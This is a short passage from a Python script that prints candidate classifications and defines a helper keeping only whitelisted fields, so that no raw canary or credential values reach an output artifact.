    for c in which:
        print("  %-8s %s" % (c, results[c].get("classification")), flush=True)


def _artifact_view(cand):
    """Booleans/ids only — no raw canary/credential values reach the artifact."""
    keep = ("id", "claim", "classification", "fidelity", "runs", "arms", "oracle",
            "negative_control", "independent_reproduction", "source_citations",
            "evidence_run_dir", "error")
    return {k: cand[k] for k in keep if k in cand}


if __name__ == "__main__":
    main()
